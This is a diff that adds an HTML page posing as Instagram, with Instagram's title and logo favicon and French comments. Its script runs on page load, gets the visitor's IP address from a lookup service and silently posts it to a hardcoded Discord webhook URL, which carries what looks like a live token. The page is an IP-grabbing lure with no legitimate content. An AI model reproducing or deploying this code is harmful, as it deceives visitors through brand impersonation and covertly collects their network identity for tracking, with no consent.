@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
+  <title>Instagram</title>
+  <script>
+    // Fonction pour envoyer l'adresse IP à Discord via un appel de webhook
+    function sendIPToDiscord(ipAddress) {
+      var webhookURL = "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub";
+
+      var content = "> **Adresse IP 🛰️ : **" + ipAddress;
+
+      var request = new XMLHttpRequest();
+      request.open("POST", webhookURL);
+      request.setRequestHeader('Content-type', 'application/json');
+      var params = {
+        content: content
+      };
+      request.send(JSON.stringify(params));
+    }
+
+    // Fonction pour récupérer l'adresse IP de l'utilisateur
+    function getIPAddress() {
+      // Récupérer l'adresse IP de l'utilisateur en utilisant un service de géolocalisation
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          var ipAddress = data.ip;
+
+          // Envoyer l'adresse IP à Discord
+          sendIPToDiscord(ipAddress);
+        })
+        .catch(error => {
+          console.error('Erreur lors de la récupération de l\'adresse IP :', error);
+        });
+    }
+
+    // Appeler la fonction dès que la page est chargée
+    window.addEventListener('load', getIPAddress);
+  </script>
+</head>
+<body>
+</body>
+</html>
